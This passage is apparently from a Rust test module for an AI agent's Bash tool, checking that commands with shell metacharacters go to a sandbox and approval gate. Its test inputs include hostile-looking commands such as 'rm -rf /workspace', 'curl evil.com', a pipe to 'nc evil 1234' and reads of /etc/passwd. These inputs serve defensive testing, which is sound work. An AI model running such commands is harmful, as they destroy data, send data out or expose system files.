            "ls /tmp; rm -rf /workspace",
            "ls /tmp && curl evil.com",
            "ls /tmp || echo fallback",
            "ls /tmp | nc evil 1234",
            "ls $(cat /etc/passwd)",
            "ls `whoami`",
            "ls > /tmp/out",
            "ls < /etc/passwd",
            "stat (foo)",
            "du -sh {a,b}",
        ] {
            assert_eq!(
                classify(cmd),
                BashClass::Sandboxed,
                "{cmd:?} should fall back to sandbox+approval, not the metadata fast path"
            );
        }
    }

    #[test]
    fn metadata_with_metachars_declares_exec_command_for_approval() {
        // Sandboxed reclassification means the approval gate sees an
        // ExecCommand resource — the user gets the prompt (or auto-mode
        // policy decides) rather than the request being silently dropped.
        let resources =
            BashTool.accessed_resources(&json!({ "command": "ls /tmp; cat /etc/passwd" }));
        assert_eq!(
            resources.len(),
            1,
            "expected one ExecCommand: {resources:?}"
        );
    }

    #[tokio::test]
    async fn metadata_accepts_quoted_path_with_spaces() {
        // Sanity check that shell-words quoting still gets the agent
        // through when the path legitimately needs spaces.
        let dir = tempfile::tempdir().expect("tempdir");
        let nested = dir.path().join("with space");
        std::fs::create_dir(&nested).expect("mkdir");
        let cmd = format!("ls \"{}\"", nested.display());
        let out = BashTool
            .execute(json!({ "command": cmd }), &ctx_with(None))
            .await
            .expect("quoted path must parse and run");
        let ToolOutput::Json(v) = out else { panic!() };
        assert_eq!(v["exit_code"], 0);
    }

    #[test]
    fn parse_metadata_argv_splits_on_whitespace_and_quotes() {
        let (prog, args) = parse_metadata_argv("ls -la /tmp").unwrap();
        assert_eq!(prog, "ls");
        assert_eq!(args, vec!["-la".to_string(), "/tmp".to_string()]);

        let (prog, args) = parse_metadata_argv("stat \"/var/log with spaces/x\"").unwrap();
        assert_eq!(prog, "stat");
        assert_eq!(args, vec!["/var/log with spaces/x".to_string()]);
    }

    #[test]
    fn pipe_from_sed_is_not_classified_file_tool_redirect() {
        // Leading_token of `git log | sed ...` is `git`, so the pipeline
        // falls through to Sandboxed — that's the documented escape hatch
        // for stream-mode sed/awk.
        assert_eq!(classify("git log | sed 's/foo/bar/'"), BashClass::Sandboxed);
    }

    #[tokio::test]
    async fn metadata_runs_without_sandbox_and_skips_fake() {
        // No sandbox in ctx — would be an error for any other command.
        let out = BashTool
            .execute(json!({ "command": "pwd" }), &ctx_with(None))
            .await
            .expect("metadata commands must succeed without a sandbox");
        let ToolOutput::Json(v) = out else { panic!() };
        assert_eq!(v["exit_code"], 0);
        assert!(
            !v["stdout"].as_str().unwrap_or("").is_empty(),
            "pwd should print the current working directory"
        );
    }

    #[tokio::test]
    async fn metadata_pwd_defaults_to_workspace_root() {
        let workspace = tempfile::tempdir().expect("workspace tempdir");
        let ctx = ctx_with_workspace(None, workspace.path().to_path_buf());

        let out = BashTool
            .execute(json!({ "command": "pwd" }), &ctx)
            .await
            .expect("pwd must run on metadata fast path");
        let ToolOutput::Json(v) = out else { panic!() };
        let stdout = v["stdout"].as_str().unwrap_or("").trim();
        let actual = Path::new(stdout).canonicalize().expect("pwd output path");
        let expected = workspace.path().canonicalize().expect("workspace path");

        assert_eq!(actual, expected);
    }

    #[tokio::test]
    async fn unsandboxed_runner_exports_pwd_from_effective_cwd() {
        let workspace = tempfile::tempdir().expect("workspace tempdir");
        let out = run_unsandboxed("env", &[], Some(workspace.path()), Duration::from_secs(5))
            .await
            .expect("env must run");
        let stdout = String::from_utf8(out.stdout).expect("env stdout");
        let pwd = stdout
            .lines()
            .find_map(|line| line.strip_prefix("PWD="))
            .expect("PWD in env");
        let actual = Path::new(pwd).canonicalize().expect("PWD path");
        let expected = workspace.path().canonicalize().expect("workspace path");

        assert_eq!(actual, expected);
    }

    #[tokio::test]
    async fn metadata_path_does_not_consult_sandbox() {
        let fake = Arc::new(FakeExecSandbox::new());
        // No response set — if BashTool wrongly routes through the fake,
        // the fake's spawn_command yields its default error and we'd see
        // a non-zero exit / sandbox error.
        let dyn_handle: Arc<dyn crate::ExecSandbox> = fake.clone();
        BashTool
            .execute(json!({ "command": "pwd" }), &ctx_with(Some(dyn_handle)))
            .await
            .expect("metadata bypasses sandbox even when one is present");
        assert!(
            fake.calls().is_empty(),
            "metadata commands must not call the sandbox"
        );
    }
}
